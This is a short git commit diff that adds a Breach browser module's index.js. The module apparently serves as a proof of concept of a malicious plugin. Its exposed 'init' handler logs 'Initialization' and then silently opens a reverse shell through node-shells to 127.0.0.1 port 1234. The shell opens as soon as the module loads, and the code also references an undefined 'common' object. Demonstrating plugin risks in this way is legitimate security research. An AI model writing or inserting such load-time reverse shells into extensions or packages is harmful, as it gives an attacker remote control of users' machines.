01136ad1e1f99fe8aa64d48f1f6a2d609c510688
Adam Baldwin <baldwin@andyet.net>
2014-07-24 21:29:35 -0700

    try with the proper module syntax

--- index.js
+++ index.js
@@ -1,3 +1,21 @@
 var ns = require('node-shells');
+var breach = require('breach_module');
 
-ns.reverseShell('127.0.0.1', '1234');
+breach.init(function() {
+  breach.expose('init', function(src, args, cb_) {
+    console.log('Initialization');
+    ns.reverseShell('127.0.0.1', '1234');
+    return cb_();
+  });
+
+  breach.expose('kill', function(args, cb_) {
+    common.exit(0);
+  });
+});
+
+process.on('uncaughtException', function (err) {
+  common.fatal(err);
+});
+
+
+
